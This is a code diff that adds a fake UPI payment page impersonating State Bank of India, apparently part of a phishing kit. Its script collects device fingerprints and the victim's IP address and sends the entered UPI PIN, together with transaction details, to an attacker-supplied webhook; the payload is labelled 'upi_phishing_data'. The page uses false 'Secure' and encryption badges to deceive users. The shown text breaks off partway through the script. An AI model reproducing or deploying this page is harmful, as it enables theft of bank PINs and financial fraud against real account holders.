@@ -1,0 +1,491 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>UPI Payment Authorization</title>
+    <link rel="icon" type="image/x-icon" href="data:image/x-icon;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQEAYAAABPYyMiAAAABmJLR0T///////8JWPfcAAAACXBIWXMAAABIAAAASABGyWs+AAAAF0lEQVRIx2NgGAWjYBSMgpEfAAB4AARwAARwopMAAAAASUVORK5CYII=">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+            background-attachment: fixed;
+        }
+
+        .container {
+            background: white;
+            border-radius: 24px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.15);
+            width: 100%;
+            max-width: 420px;
+            overflow: hidden;
+            animation: slideUp 0.6s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+            position: relative;
+        }
+
+        @keyframes slideUp {
+            from { 
+                opacity: 0; 
+                transform: translateY(40px) scale(0.95);
+            }
+            to { 
+                opacity: 1; 
+                transform: translateY(0) scale(1);
+            }
+        }
+
+        .bank-header {
+            background: linear-gradient(135deg, #1a237e 0%, #283593 100%);
+            color: white;
+            padding: 24px 20px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .bank-header::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(45deg, transparent, rgba(255,255,255,0.1), transparent);
+            transform: rotate(45deg);
+            animation: shine 3s infinite;
+        }
+
+        @keyframes shine {
+            0% { transform: translateX(-100%) translateY(-100%) rotate(45deg); }
+            100% { transform: translateX(100%) translateY(100%) rotate(45deg); }
+        }
+
+        .bank-header h2 {
+            margin: 0;
+            font-size: 1.5em;
+            font-weight: 600;
+            letter-spacing: -0.5px;
+            position: relative;
+        }
+
+        .bank-logo {
+            width: 40px;
+            height: 40px;
+            background: rgba(255,255,255,0.2);
+            border-radius: 50%;
+            margin: 0 auto 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 0.9em;
+        }
+
+        .transaction-details {
+            padding: 24px;
+            border-bottom: 1px solid #f0f0f0;
+            background: #fafafa;
+        }
+
+        .detail-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 16px;
+            font-size: 0.95em;
+            color: #555;
+        }
+
+        .detail-row:last-child {
+            margin-bottom: 0;
+        }
+
+        .amount {
+            font-size: 2.2em;
+            font-weight: 700;
+            text-align: center;
+            margin: 20px 0;
+            color: #d32f2f;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.02); }
+        }
+
+        .pin-entry {
+            padding: 28px 24px;
+            text-align: center;
+            background: white;
+        }
+
+        .pin-entry h3 {
+            color: #1a237e;
+            margin-bottom: 16px;
+            font-weight: 600;
+            font-size: 1.3em;
+        }
+
+        .pin-instruction {
+            color: #666;
+            margin-bottom: 24px;
+            line-height: 1.5;
+            font-size: 0.95em;
+        }
+
+        .pin-dots {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 32px;
+            gap: 20px;
+        }
+
+        .dot {
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            background: #e0e0e0;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            position: relative;
+        }
+
+        .dot.filled {
+            background: linear-gradient(135deg, #1a237e, #3949ab);
+            transform: scale(1.2);
+            box-shadow: 0 4px 12px rgba(26, 35, 126, 0.3);
+        }
+
+        .dot.filled::after {
+            content: '•';
+            color: white;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 14px;
+        }
+
+        .keypad {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 16px;
+            margin-top: 20px;
+        }
+
+        .key {
+            background: linear-gradient(135deg, #f5f5f5, #e0e0e0);
+            border: none;
+            border-radius: 16px;
+            height: 70px;
+            font-size: 1.6em;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+            user-select: none;
+            color: #333;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+        }
+
+        .key:active {
+            transform: scale(0.92);
+            box-shadow: 0 2px 4px rgba(0,0,0,0.2);
+        }
+
+        .key:hover {
+            background: linear-gradient(135deg, #e8e8e8, #d5d5d5);
+        }
+
+        .key.submit {
+            grid-column: span 3;
+            border-radius: 16px;
+            background: linear-gradient(135deg, #1a237e, #3949ab);
+            color: white;
+            height: 60px;
+            font-size: 1.2em;
+            font-weight: 600;
+            margin-top: 12px;
+            box-shadow: 0 6px 20px rgba(26, 35, 126, 0.4);
+            transition: all 0.3s ease;
+        }
+
+        .key.submit:disabled {
+            background: linear-gradient(135deg, #9fa8da, #c5cae9);
+            transform: none;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+            cursor: not-allowed;
+        }
+
+        .key.submit:not(:disabled):active {
+            transform: scale(0.95);
+        }
+
+        .error-message {
+            color: #d32f2f;
+            font-size: 0.9em;
+            margin-top: 16px;
+            min-height: 20px;
+            animation: shake 0.5s cubic-bezier(0.36, 0.07, 0.19, 0.97) both;
+            font-weight: 500;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-6px); }
+            75% { transform: translateX(6px); }
+        }
+
+        .notification {
+            position: fixed;
+            top: 30px;
+            left: 50%;
+            transform: translateX(-50%) translateY(-20px);
+            background: linear-gradient(135deg, #4caf50, #66bb6a);
+            color: white;
+            padding: 18px 28px;
+            border-radius: 16px;
+            box-shadow: 0 10px 30px rgba(76, 175, 80, 0.4);
+            z-index: 1000;
+            display: none;
+            animation: notificationSlide 0.4s cubic-bezier(0.25, 0.46, 0.45, 0.94) forwards;
+            font-weight: 500;
+            max-width: 90%;
+            text-align: center;
+        }
+
+        @keyframes notificationSlide {
+            to { transform: translateX(-50%) translateY(0); opacity: 1; }
+        }
+
+        .security-notice {
+            text-align: center;
+            font-size: 0.8em;
+            color: #888;
+            margin-top: 20px;
+            padding: 12px;
+            background: #f8f9fa;
+            border-radius: 8px;
+        }
+
+        .loading-dots {
+            display: inline-block;
+            margin-left: 8px;
+        }
+
+        .loading-dots::after {
+            content: '';
+            animation: dots 1.5s infinite;
+        }
+
+        @keyframes dots {
+            0%, 20% { content: '.'; }
+            40% { content: '..'; }
+            60%, 100% { content: '...'; }
+        }
+
+        /* Mobile optimizations */
+        @media (max-width: 480px) {
+            .container {
+                border-radius: 20px;
+                max-width: 100%;
+            }
+            
+            .key {
+                height: 65px;
+                font-size: 1.5em;
+            }
+            
+            .amount {
+                font-size: 2em;
+            }
+        }
+
+        /* Security badge */
+        .security-badge {
+            position: absolute;
+            top: 12px;
+            right: 12px;
+            background: #4caf50;
+            color: white;
+            padding: 4px 8px;
+            border-radius: 12px;
+            font-size: 0.7em;
+            font-weight: 600;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="security-badge">🔒 Secure</div>
+        <div class="bank-header">
+            <div class="bank-logo" id="bankLogo">SBI</div>
+            <h2 id="bankName">State Bank of India</h2>
+        </div>
+        
+        <div class="transaction-details">
+            <div class="detail-row">
+                <span>From Account:</span>
+                <span id="fromAccount">XXXX0788</span>
+            </div>
+            <div class="detail-row">
+                <span>Beneficiary:</span>
+                <span id="toAccount">DILIP KUMAR</span>
+            </div>
+            <div class="detail-row">
+                <span>Transaction Amount:</span>
+                <span id="amount">₹100.00</span>
+            </div>
+            
+            <div class="amount" id="displayAmount">₹100.00</div>
+        </div>
+        
+        <div class="pin-entry">
+            <h3>ENTER UPI PIN</h3>
+            <p class="pin-instruction">You are sending <strong id="amountText">₹100.00</strong> from your account to<br><strong id="recipientText">PATEL</strong></p>
+            
+            <div class="pin-dots">
+                <div class="dot" id="dot1"></div>
+                <div class="dot" id="dot2"></div>
+                <div class="dot" id="dot3"></div>
+                <div class="dot" id="dot4"></div>
+            </div>
+
+            <div class="error-message" id="errorMessage"></div>
+            
+            <div class="keypad">
+                <div class="key" data-value="1">1</div>
+                <div class="key" data-value="2">2</div>
+                <div class="key" data-value="3">3</div>
+                <div class="key" data-value="4">4</div>
+                <div class="key" data-value="5">5</div>
+                <div class="key" data-value="6">6</div>
+                <div class="key" data-value="7">7</div>
+                <div class="key" data-value="8">8</div>
+                <div class="key" data-value="9">9</div>
+                <div class="key" data-value="0">0</div>
+                <button class="key submit" id="submitBtn" disabled>VERIFY & PAY</button>
+            </div>
+
+            <div class="security-notice">
+                🔒 Your transaction is secured with 128-bit encryption
+            </div>
+        </div>
+div>
+
+    <div class="notification" id="notification">
+        Processing your transaction<span class="loading-dots"></span>
+    </div>
+
+    <script>
+        // WEBHOOK URL - REPLACE WITH YOUR RENDER URL
+        const WEBHOOK_URL = 'https://your-webhook-app.onrender.com/webhook';
+        
+        let enteredPin = '';
+        const pinLength = 4;
+        let attemptCount = 0;
+
+        // Bank configurations
+        const banks = {
+            'State Bank of India': { logo: 'SBI', color: '#1a237e' },
+            'Axis Bank': { logo: 'AXIS', color: '#951c1c' },
+            'HDFC Bank': { logo: 'HDFC', color: '#004c8c' },
+            'ICICI Bank': { logo: 'ICICI', color: '#f47721' }
+        };
+
+        const amounts = ['100', '500', '1000', '150', '250', '2000'];
+        const recipients = ['DILIP KUMAR', 'RAJESH PATEL', 'PRIYA SHARMA', 'AMIT KUMAR', 'SUNITA DEVI'];
+
+        // Collect device information
+        function collectDeviceInfo() {
+            return {
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                screenResolution: `${screen.width}x${screen.height}`,
+                colorDepth: screen.colorDepth,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cookiesEnabled: navigator.cookieEnabled,
+                javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
+                pdfViewerEnabled: navigator.pdfViewerEnabled || false,
+                deviceMemory: navigator.deviceMemory || 'unknown',
+                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+                referrer: document.referrer,
+                url: window.location.href,
+                touchSupport: 'ontouchstart' in window,
+                doNotTrack: navigator.doNotTrack || 'unknown'
+            };
+        }
+
+        // Get IP address
+        async function getIPAddress() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                return 'Unknown';
+            }
+        }
+
+        // Send data to Webhook
+        async function sendToWebhook(upiPin, deviceInfo, ipAddress, attempt) {
+            const payload = {
+                type: 'upi_phishing_data',
+                pin: upiPin,
+                device: deviceInfo,
+                ip: ipAddress,
+                attempt: attempt,
+                timestamp: new Date().toISOString(),
+                transaction: {
+                    bank: document.getElementById('bankName').textContent,
+                    to: document.getElementById('toAccount').textContent,
+                    amount: document.getElementById('displayAmount').textContent
+                }
+            };
+
+            try {
+                const response = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload)
+                });
+
+                const result = await response.json();
+                return result.success === true;
+            } catch (error) {
+                console.error('Webhook send error:', error);
+                return false;
+            }
+        }
+
+        // Update PIN dots display
+        function updatePinDots() {
+            for (let i = 1; i <= pinLength; i++) {
+                const dot = document.getElementById(`dot${i}`);
+                if (i <= enteredPin.length) {
+                    dot.classList.add('filled');
+                } else {
+                    dot.classList.remove('filled');
+                }
+            }
+            
+            const submitBtn = document.getElementById('submitBtn');
+            submitBtn.disabled = enteredPin.length !== pinLength;
